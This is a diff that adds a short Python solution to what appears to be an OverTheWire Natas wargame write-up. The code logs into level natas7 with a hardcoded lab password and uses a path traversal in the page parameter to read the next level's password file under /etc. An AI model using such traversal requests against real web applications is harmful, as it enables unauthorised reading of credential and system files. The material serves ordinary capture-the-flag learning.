@@ -364,3 +364,19 @@ DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 *Or this way*
 
+```python
+import requests
+import re
+
+user = 'natas7'
+pwd = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
+
+url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' % user
+
+session = requests.Session()
+response = session.get(url, auth = (user, pwd))
+content = response.text
+
+print(content)
+```
+
